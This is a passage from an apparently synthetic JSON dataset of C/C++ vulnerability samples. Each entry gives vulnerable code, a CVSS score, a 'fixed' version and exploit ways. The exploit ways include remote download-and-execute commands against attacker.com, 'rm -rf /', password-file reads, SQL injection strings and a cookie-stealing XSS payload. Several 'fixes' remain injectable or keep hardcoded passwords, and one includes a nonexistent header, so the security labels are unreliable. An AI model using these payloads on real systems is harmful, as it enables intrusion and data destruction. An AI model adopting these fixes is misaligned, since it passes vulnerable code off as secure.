{
    "c_0": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <stdio.h>\\n#include <stdlib.h>\\n\\nvoid escalate_privileges() {\\n    system(\"sudo -u root whoami\");\\n}\\n\\nint main() {\\n    escalate_privileges();\\n    return 0;\\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <stdio.h>\\n#include <stdlib.h>\\n\\nvoid escalate_privileges() {\\n    // Privilege escalation is not allowed here\\n}\\n\\nint main() {\\n    printf(\"This program does not escalate privileges.\");\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can modify the sudoers file to allow executing commands without a password.",
            "Exploiting vulnerabilities in the 'sudo' binary or its configuration files could allow privilege escalation.",
            "If the program is scheduled to run with cron, an attacker might modify the crontab entry to execute malicious code."
        ]
    },
    "c_1": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid process_request(char *request) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"http://example.com/set?value=%s\", request);\n    printf(\"Redirecting to: %s\\n\", buffer);\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid process_request(char *request, char *csrf_token) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"http://example.com/set?value=%s&token=%s\", request, csrf_token);\n    printf(\"Redirecting to: %s\\n\", buffer);\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link that users click on, tricking them into changing settings without their knowledge.",
            "Using a CSRF token mismatch attack, an attacker sends requests with invalid tokens to bypass the protection mechanism.",
            "Embedding malicious scripts in web pages visited by the victim can automatically send forged requests to perform actions."
        ]
    },
    "c_2": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_request(char* user_id, char* action) {\n    printf(\"Sending request to perform %s on user %s\\n\", action, user_id);\n}\n\nint main() {\n    char user_input[100];\n    printf(\"Enter user ID: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    send_request(user_input, \"transfer_funds\");\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string_t>\n\nvoid send_request(char* user_id, char* action, char* token) {\n    printf(\"Sending request with token %s to perform %s on user %s\\n\", token, action, user_id);\n}\n\nint main() {\n    char user_input[100];\n    char token[] = \"secure_random_token_here\";\n    printf(\"Enter user ID: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    send_request(user_input, \"transfer_funds\", token);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could trick a logged-in admin to visit a malicious website that sends a request to perform an action on their behalf.",
            "Crafting links in emails or forums with the target URL can automatically execute actions when clicked by a victim if they are authenticated.",
            "Using social engineering, attackers may convince users to submit forms unknowingly, performing actions like transferring funds without user consent."
        ]
    },
    "c_3": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid deserialize(char *data) {\n    int (*func_ptr)();\n    memcpy(&func_ptr, data + 4, sizeof(func_ptr));\n    func_ptr();\n}\n\nint main() {\n    char buffer[1024];\n    printf(\"Enter serialized data: \");\n    fgets(buffer, sizeof(buffer), stdin);\n    deserialize(buffer);\n    return 0;\n}",
        "cvss_score": 9.0,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid safe_deserialize(char *data) {\n    // Assuming data should only be specific valid commands or values\n    if (strncmp(data, \"valid_command\", 13) == 0) {\n        printf(\"Executing valid command.\\n\");\n    } else {\n        printf(\"Invalid input.\\n\");\n    }\n}\n\nint main() {\n    char buffer[1024];\n    printf(\"Enter serialized data: \");\n    fgets(buffer, sizeof(buffer), stdin);\n    safe_deserialize(buffer);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject a pointer to malicious code in the serialized data to execute arbitrary commands.",
            "By carefully crafting the input data, an attacker could cause a buffer overflow leading to remote code execution.",
            "The vulnerability can be exploited to perform return-oriented programming (ROP) attacks by redirecting control flow."
        ]
    },
    "c_4": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\\n#include <stdlib.h>\\nvoid insecure_deserialize(char *data) {\\n    int (*func_ptr)();\\n    sscanf(data, \"%p\", (void**)&func_ptr);\\n    func_ptr();\\n}",
        "cvss_score": 7.2,
        "fixed_code": "#include <stdio.h>\\n#include <stdlib.h>\\nvoid secure_deserialize(char *data) {\\n    // Example of a safe function that does not use insecure deserialization\\n    printf(\"Data received: %s\", data);\\n}",
        "exploit_ways": [
            "An attacker could provide a pointer to a malicious function, leading to arbitrary code execution.",
            "Crafting specific memory addresses in the input could lead to overwriting important program variables or memory sections.",
            "Using format string vulnerabilities in sscanf could potentially leak sensitive data from the stack."
        ]
    },
    "c_5": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nstruct Data {\n    char *content;\n};\n\nvoid deserialize(struct Data **obj, const char *str) {\n    *obj = (struct Data *)malloc(sizeof(struct Data));\n    (*obj)->content = strdup(str);\n}\n\nint main() {\n    struct Data *data;\n    deserialize(&data, \"malicious_data_here\\nmore_malicious_code\");\n    printf(\"Deserialized data: %s\\n\", data->content);\n    free(data->content);\n    free(data);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nstruct Data {\n    char *content;\n};\n\nvoid deserialize(struct Data **obj, const char *str) {\n    if (strlen(str) > 1024) { // Example validation step\n        fprintf(stderr, \"Input too long\\n\");\n        exit(EXIT_FAILURE);\n    }\n    *obj = (struct Data *)malloc(sizeof(struct Data));\n    (*obj)->content = strdup(str);\n}\n\nint main() {\n    struct Data *data;\n    deserialize(&data, \"safe_data_here\");\n    printf(\"Deserialized data: %s\\n\", data->content);\n    free(data->content);\n    free(data);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could inject malicious content that overflows the expected input length, leading to a buffer overflow.",
            "If the deserialized data is used in further operations without validation, it could lead to code execution if crafted carefully.",
            "By injecting specially formatted strings, an attacker might be able to manipulate the program's behavior or leak sensitive information."
        ]
    },
    "c_6": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nclass Executor {\npublic:\n    void runCommand(const char* cmd) {\n        system(cmd);\n    }\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\nclass Executor {\npublic:\n    void runCommand(const char* cmd) {\n        // Use execvp with argument vector to avoid shell injection\n        const char* args[] = {\"/bin/sh\", \"-c\", cmd, nullptr};\n        execvp(\"/bin/sh\", (char* const*)args);\n    }\n};",
        "exploit_ways": [
            "An attacker could input 'echo vulnerable > /tmp/test' to create a file indicating the system is compromised.",
            "Using '; rm -rf /' could delete all files on the system.",
            "Chaining commands with '; wget http://attacker.com/malware; chmod +x malware; ./malware' could install and execute malicious software."
        ]
    },
    "c_7": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nstruct User {\n    char *name;\n    int age;\n};\n\nvoid deserialize_user(struct User *user, const char *data) {\n    user->name = strdup(data);\n}\n\nint main() {\n    struct User user;\n    deserialize_user(&user, \"John Doe; rm -rf /\");\n    printf(\"User name: %s\\n\", user.name);\n    free(user.name);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nstruct User {\n    char *name;\n    int age;\n};\n\nvoid deserialize_user(struct User *user, const char *data) {\n    size_t length = strcspn(data, \";\");\n    user->name = (char *)malloc(length + 1);\n    strncpy(user->name, data, length);\n    user->name[length] = '\\0';\n}\n\nint main() {\n    struct User user;\n    deserialize_user(&user, \"John Doe; rm -rf /\");\n    printf(\"User name: %s\\n\", user.name);\n    free(user.name);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject malicious commands into the deserialized data to be executed in the context of the vulnerable application.",
            "By crafting a payload with specific control characters, an attacker might manipulate the behavior of the program to access unauthorized resources or perform unintended actions.",
            "The vulnerability can potentially lead to arbitrary code execution if combined with other vulnerabilities that allow for command injection."
        ]
    },
    "c_8": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    char filename[256];\n    printf(\"Enter file name to read: \");\n    scanf(\"%s\", filename);\n    FILE *file = fopen(filename, \"r\");\n    if (file) {\n        fclose(file);\n        printf(\"File opened successfully.\\n\");\n    } else {\n        printf(\"Failed to open file.\\n\");\n    }\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define SAFE_DIR \"/safe_dir/\"\n\nint main() {\n    char filename[256];\n    char safe_path[256];\n    printf(\"Enter file name to read: \");\n    scanf(\"%s\", filename);\n    snprintf(safe_path, sizeof(safe_path), \"%s%s\", SAFE_DIR, filename);\n    FILE *file = fopen(safe_path, \"r\");\n    if (file) {\n        fclose(file);\n        printf(\"File opened successfully.\\n\");\n    } else {\n        printf(\"Failed to open file.\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can input \"../etc/passwd\" to read sensitive system files.",
            "They could use \"../../var/log/auth.log\" to access authentication logs.",
            "Inputting \"../../../../flag.txt\" might allow retrieval of a secret flag file."
        ]
    },
    "c_9": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\n\\nint authenticate(char *password) {\\n    char secret[16];\\n    strcpy(secret, \"s3cr3tP@ssw0rd!\");\\n    return strcmp(password, secret) == 0;\\n}\\n\\nint main() {\\n    char pass[256];\\n    printf(\"Enter password: \");\\n    scanf(\"%s\", pass);\\n    if (authenticate(pass)) {\\n        printf(\"Access granted!\\n\");\\n    } else {\\n        printf(\"Access denied!\\n\");\\n    }\\n    return 0;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n#include <stdlib.h>\\n\\n#define PASSWORD \"s3cr3tP@ssw0rd!\"\\n\\nint authenticate(const char *password) {\\n    return strcmp(password, PASSWORD) == 0;\\n}\\n\\nint main() {\\n    char pass[256];\\n    printf(\"Enter password: \");\\n    if (fgets(pass, sizeof(pass), stdin)) {\\n        size_t len = strlen(pass);\\n        if (len > 0 && pass[len - 1] == '\\n') {\\n            pass[len - 1] = '\\0';\\n        }\\n    }\\n    if (authenticate(pass)) {\\n        printf(\"Access granted!\\n\");\\n    } else {\\n        printf(\"Access denied!\\n\");\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can use brute force to guess the password.",
            "Using a buffer overflow, an attacker might be able to exploit the fixed-size array vulnerability.",
            "If compiled on a system with predictable memory layout, an attacker might try to bypass authentication by injecting specific input."
        ]
    },
    "c_10": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\nclass VulnerableClass {\\npublic:\\n    void unsafeFunction(char* input) {\\n        char buffer[10];\\n        strcpy(buffer, input);\\n    }\\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\nclass SecureClass {\\npublic:\\n    void safeFunction(const char* input) {\\n        char buffer[10];\\n        strncpy(buffer, input, sizeof(buffer) - 1);\\n        buffer[sizeof(buffer) - 1] = '\\0';\\n    }\\n};",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 characters to overwrite adjacent memory.",
            "Can use crafted input to corrupt the stack and execute arbitrary code.",
            "Could potentially alter program flow by overwriting return addresses on the stack."
        ]
    },
    "c_11": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    char command[256];\n    printf(\"Enter command to execute: \");\n    fgets(command, sizeof(command), stdin);\n    system(command);\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char command[256];\n    printf(\"Enter command to execute: \");\n    fgets(command, sizeof(command), stdin);\n    command[strcspn(command, \"\\n\")] = 0;\n    if (strcmp(command, \"allowed_command\") == 0) {\n        system(command);\n    } else {\n        printf(\"Command not allowed\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'ls -la' to list all files in the directory.",
            "Could use 'whoami' to find out the current user running the program.",
            "Could chain commands like 'echo Hello; rm *' to delete files."
        ]
    },
    "c_12": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nvoid process_data(const char *data) {\n    FILE *fp;\n    fp = popen(data, \"r\");\n    if (fp == NULL) {\n        printf(\"Failed to run command\\n\" );\n        exit(1);\n    }\n    pclose(fp);\n}",
        "cvss_score": 7.8,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid process_data(const char *data) {\n    const char *allowed_commands[] = {\"ls\", \"whoami\", NULL};\n    int is_allowed = 0;\n    for (int i = 0; allowed_commands[i] != NULL; i++) {\n        if (strcmp(data, allowed_commands[i]) == 0) {\n            is_allowed = 1;\n            break;\n        }\n    }\n    if (!is_allowed) {\n        printf(\"Command not allowed\\n\");\n        return;\n    }\n    FILE *fp;\n    fp = popen(data, \"r\");\n    if (fp == NULL) {\n        printf(\"Failed to run command\\n\" );\n        exit(1);\n    }\n    pclose(fp);\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c_13": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nint authenticate(char *username, char *password) {\n    if (strcmp(username, \"admin\") == 0 && strcmp(password, \"secret\") == 0) {\n        return 1;\n    }\n    return 0;\n}\n\nint main() {\n    char username[256], password[256];\n    printf(\"Enter username: \");\n    scanf(\"%s\", username);\n    printf(\"Enter password: \");\n    scanf(\"%s\", password);\n    if (authenticate(username, password)) {\n        printf(\"Access granted.\\n\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint authenticate(const char *username, const char *password) {\n    if (strcmp(username, \"admin\") == 0 && strcmp(password, getenv(\"ADMIN_PASSWORD\")) == 0) {\n        return 1;\n    }\n    return 0;\n}\n\nint main() {\n    char username[256], password[256];\n    printf(\"Enter username: \");\n    fgets(username, sizeof(username), stdin);\n    username[strcspn(username, \"\\n\")] = 0;\n    printf(\"Enter password: \");\n    fgets(password, sizeof(password), stdin);\n    password[strcspn(password, \"\\n\")] = 0;\n    if (authenticate(username, password)) {\n        printf(\"Access granted.\\n\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can guess the default username 'admin' and try common passwords.",
            "Using brute force to try multiple combinations of usernames and passwords.",
            "Exploiting predictable or weak password policies to gain unauthorized access."
        ]
    },
    "c_14": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid print_message(char *name) {\n    printf(\"Hello, %s!\\n\", name);\n}\n\nint main() {\n    char user_input[100];\n    printf(\"Enter your name: \");\n    scanf(\"%99s\", user_input);\n    print_message(user_input);\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid escape_html(char *str, char *escaped_str) {\n    while (*str) {\n        switch(*str) {\n            case '<': strcat(escaped_str, \"&lt;\"); break;\n            case '>': strcat(escaped_str, \"&gt;\"); break;\n            case '&': strcat(escaped_str, \"&amp;\"); break;\n            case '\"': strcat(escaped_str, \"&quot;\"); break;\n            default: strncat(escaped_str, str, 1);\n        }\n        str++;\n    }\n}\n\nvoid print_message(char *name) {\n    char escaped_name[200];\n    escape_html(name, escaped_name);\n    printf(\"Hello, %s!\\n\", escaped_name);\n}\n\nint main() {\n    char user_input[100];\n    printf(\"Enter your name: \");\n    scanf(\"%99s\", user_input);\n    print_message(user_input);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input a script tag like <script>alert('XSS')</script> to execute JavaScript in the context of the application.",
            "Inputting <img src=x onerror=alert(1)> can trigger an alert without needing to close tags, potentially bypassing naive filters.",
            "Using <svg/onload=prompt(document.cookie)> could be used to steal cookies or perform other malicious actions."
        ]
    },
    "c_15": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nvoid read_file(char *filename) {\n    char path[100];\n    snprintf(path, sizeof(path), \"/var/log/%s.log\", filename);\n    FILE *file = fopen(path, \"r\");\n    if (file) {\n        char buffer[256];\n        while (fgets(buffer, sizeof(buffer), file)) {\n            printf(\"%s\", buffer);\n        }\n        fclose(file);\n    } else {\n        perror(\"Failed to open file\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid read_file(char *filename) {\n    char path[100];\n    if (strchr(filename, '/') != NULL || strchr(filename, '\\\\') != NULL) {\n        fprintf(stderr, \"Invalid filename\\n\");\n        return;\n    }\n    snprintf(path, sizeof(path), \"/var/log/%s.log\", filename);\n    FILE *file = fopen(path, \"r\");\n    if (file) {\n        char buffer[256];\n        while (fgets(buffer, sizeof(buffer), file)) {\n            printf(\"%s\", buffer);\n        }\n        fclose(file);\n    } else {\n        perror(\"Failed to open file\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"../etc/passwd\" to read the system's password file.",
            "They can use \"../../shadow\" to attempt to access hashed passwords, if permissions allow.",
            "Input like \"..%2F..%2F..%2Fetc%2Fpasswd\" using URL encoding may also bypass simple checks."
        ]
    },
    "c_16": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(char* cmd) {\n    char buffer[128];\n    snprintf(buffer, sizeof(buffer), \"echo %s\", cmd);\n    system(buffer);\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(char* cmd) {\n    char buffer[128];\n    if (snprintf(buffer, sizeof(buffer), \"echo %s\", cmd) >= sizeof(buffer)) {\n        fprintf(stderr, \"Command too long\\n\");\n        return;\n    }\n    system(buffer);\n}",
        "exploit_ways": [
            "An attacker can input \"; rm -rf /\" to delete all files.",
            "They could use \"; curl http://attacker.com/malicious.sh | sh\" to download and execute a script from a remote server.",
            "The command \"; cat /etc/passwd\" can be used to leak the system's user database."
        ]
    },
    "c_17": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid run_command() {\n    char cmd[100];\n    printf(\"Enter command: \");\n    gets(cmd);\n    system(cmd);\n}\n\nint main() {\n    run_command();\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid run_command() {\n    char cmd[100];\n    printf(\"Enter command: \");\n    if (fgets(cmd, sizeof(cmd), stdin) != NULL) {\n        // Remove newline character if present\n        size_t len = strlen(cmd);\n        if (len > 0 && cmd[len - 1] == '\\n') {\n            cmd[len - 1] = '\\0';\n        }\n        // Only allow specific commands\n        if (strcmp(cmd, \"ls\") == 0 || strcmp(cmd, \"whoami\") == 0) {\n            system(cmd);\n        } else {\n            printf(\"Command not allowed\\n\");\n        }\n    }\n}\n\nint main() {\n    run_command();\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'sudo -i' to gain root privileges.",
            "Could use 'id; rm /etc/passwd' to delete critical system files.",
            "Could chain commands like 'pwd; cat /etc/shadow' to leak sensitive information."
        ]
    },
    "c_18": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nint authenticate(char *username, char *password) {\n    if (strcmp(username, \"admin\") == 0 && strcmp(password, \"123456\") == 0) {\n        return 1;\n    }\n    return 0;\n}\n\nint main() {\n    char username[20], password[20];\n    printf(\"Enter username: \");\n    scanf(\"%s\", username);\n    printf(\"Enter password: \");\n    scanf(\"%s\", password);\n    if (authenticate(username, password)) {\n        printf(\"Login successful!\\n\");\n    } else {\n        printf(\"Login failed.\\n\");\n    }\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdbool.h>\n\nbool authenticate(const char *username, const char *password) {\n    const char *correct_username = \"admin\";\n    const char *correct_password = \"123456\";\n    return strcmp(username, correct_username) == 0 && strcmp(password, correct_password) == 0;\n}\n\nint main() {\n    char username[20], password[20];\n    printf(\"Enter username: \");\n    if (fgets(username, sizeof(username), stdin)) {\n        size_t len = strlen(username);\n        if (len > 0 && username[len - 1] == '\\n') {\n            username[len - 1] = '\\0';\n        }\n    }\n    printf(\"Enter password: \");\n    if (fgets(password, sizeof(password), stdin)) {\n        size_t len = strlen(password);\n        if (len > 0 && password[len - 1] == '\\n') {\n            password[len - 1] = '\\0';\n        }\n    }\n    if (authenticate(username, password)) {\n        printf(\"Login successful!\\n\");\n    } else {\n        printf(\"Login failed.\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can guess the default username 'admin' and try common passwords like '123456'.",
            "Brute force attacks could be used to attempt many different password combinations.",
            "Using a dictionary attack, an attacker might use a list of commonly used usernames and passwords."
        ]
    },
    "c_19": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid handle_request(const char *request) {\n    if (strstr(request, \"action=transfer\") != NULL) {\n        printf(\"Transferring funds...\\n\");\n        // Vulnerable code to CSRF\n    }\n}\n\nint main() {\n    const char *malicious_request = \"GET /?action=transfer HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    handle_request(malicious_request);\n    return 0;\n}",
        "cvss_score": 6.8,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid handle_request(const char *request) {\n    const char *token = \"secure_token_123\";\n    if (strstr(request, \"action=transfer\") != NULL && strstr(request, token) != NULL) {\n        printf(\"Transferring funds...\\n\");\n        // Secure code\n    }\n}\n\nint main() {\n    const char *malicious_request = \"GET /?action=transfer&token=secure_token_123 HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    handle_request(malicious_request);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could create a malicious link to trick the victim into performing unauthorized actions.",
            "By injecting the request into a CSRF attack vector, attackers can transfer funds without user consent.",
            "Using social engineering tactics, an attacker could convince a user to click on a crafted URL, triggering a fund transfer."
        ]
    },
    "c_20": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nclass DatabaseQuery {\nprivate:\n    char query[100];\npublic:\n    void setQuery(const char* userInput) {\n        strcpy(query, \"SELECT * FROM users WHERE username = '\");\n        strcat(query, userInput);\n        strcat(query, \"';\");\n    }\n\n    void execute() {\n        printf(\"Executing query: %s\\n\", query);\n        // Simulate database execution\n    }\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nclass DatabaseQuery {\nprivate:\n    char query[100];\npublic:\n    void setQuery(const char* userInput) {\n        snprintf(query, sizeof(query), \"SELECT * FROM users WHERE username = '%s';\", userInput);\n        // Use parameterized queries or proper escaping in real applications\n    }\n\n    void execute() {\n        printf(\"Executing query: %s\\n\", query);\n        // Simulate database execution\n    }\n};",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to bypass authentication.",
            "They can use \"admin'; DROP TABLE users; --\" to delete the users table.",
            "Input like \"admin'; UNION SELECT password FROM users; --\" can extract passwords."
        ]
    },
    "c_21": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(const char* command) {\n    char buffer[128];\n    snprintf(buffer, sizeof(buffer), \"ls -l %s\", command);\n    system(buffer);\n}\n\nint main() {\n    char user_input[32];\n    printf(\"Enter directory to list: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    execute_command(user_input);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(const char* command) {\n    system(command);\n}\n\nint main() {\n    char user_input[32];\n    printf(\"Enter directory to list: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    // Remove newline character if present\n    size_t len = strlen(user_input);\n    if (len > 0 && user_input[len - 1] == '\\n') {\n        user_input[len - 1] = '\\0';\n    }\n    char buffer[128];\n    snprintf(buffer, sizeof(buffer), \"ls -l %s\", user_input);\n    execute_command(buffer);\n    return 0;\n}",
        "exploit_ways": [
            "User could input \"; rm -rf /\" to delete system files.",
            "Could use \"; wget http://attacker.com/malware.sh; sh malware.sh\" to download and run malicious script.",
            "Could chain commands like \"; cat /etc/passwd > /tmp/output\" to leak sensitive files."
        ]
    },
    "c_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nclass SystemExecutor {\npublic:\n    void executeCommand(const char* cmd) {\n        system(cmd);\n    }\n};",
        "cvss_score": 7.2,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\nclass SystemExecutor {\npublic:\n    void executeCommand(const char* cmd) {\n        std::vector<std::string> allowedCommands = {\"ls\", \"whoami\"};\n        std::string command(cmd);\n        if (std::find(allowedCommands.begin(), allowedCommands.end(), command) != allowedCommands.end()) {\n            system(command.c_str());\n        } else {\n            std::cout << \"Command not allowed.\" << std::endl;\n        }\n    }\n};",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c_23": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s filename\\n\", argv[0]);\n        return 1;\n    }\n\n    char buffer[512];\n    snprintf(buffer, sizeof(buffer), \"/safe_dir/%s\", argv[1]);\n\n    FILE *file = fopen(buffer, \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open file\");\n        return 1;\n    }\n\n    char line[256];\n    while (fgets(line, sizeof(line), file)) {\n        printf(\"%s\", line);\n    }\n\n    fclose(file);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s filename\\n\", argv[0]);\n        return 1;\n    }\n\n    const char *base_dir = \"/safe_dir/\";\n    size_t base_len = strlen(base_dir);\n    size_t file_len = strlen(argv[1]);\n\n    if (file_len > 512 - base_len) {\n        printf(\"Filename too long\\n\");\n        return 1;\n    }\n\n    char buffer[512];\n    snprintf(buffer, sizeof(buffer), \"%s%s\", base_dir, argv[1]);\n\n    // Check for directory traversal attempts\n    if (strstr(buffer + base_len, \"../\") != NULL) {\n        printf(\"Invalid filename\\n\");\n        return 1;\n    }\n\n    FILE *file = fopen(buffer, \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open file\");\n        return 1;\n    }\n\n    char line[256];\n    while (fgets(line, sizeof(line), file)) {\n        printf(\"%s\", line);\n    }\n\n    fclose(file);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide a filename like \"../../etc/passwd\" to read the system's password file.",
            "Using \"../secret_data/file.txt\" could lead to reading sensitive files outside of /safe_dir/.",
            "Crafting filenames with null bytes or other special characters might bypass simple checks."
        ]
    },
    "c_24": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid insecure_deserialize(const char *data) {\n    system(data);\n}\n\nint main() {\n    const char *payload = \"rm -rf /\";\n    insecure_deserialize(payload);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid secure_function(const char *data) {\n    // Define a list of allowed commands\n    const char* allowed_commands[] = {\"ls\", \"whoami\", NULL};\n    int is_allowed = 0;\n    for (int i = 0; allowed_commands[i] != NULL; i++) {\n        if (strcmp(data, allowed_commands[i]) == 0) {\n            is_allowed = 1;\n            break;\n        }\n    }\n    if (is_allowed) {\n        system(data);\n    } else {\n        printf(\"Command not allowed\\n\");\n    }\n}\n\nint main() {\n    const char *payload = \"rm -rf /\";\n    secure_function(payload);\n    return 0;\n}",
        "exploit_ways": [
            "Attacker could input 'rm -rf /' to delete all files on the system.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid log_message(char *message) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"Logging message: %s\\n\", message);\n    printf(\"%s\", buffer);\n}\n\nint main() {\n    char user_input[512];\n    fgets(user_input, sizeof(user_input), stdin);\n    log_message(user_input);\n    return 0;\n}",
        "cvss_score": 3.3,
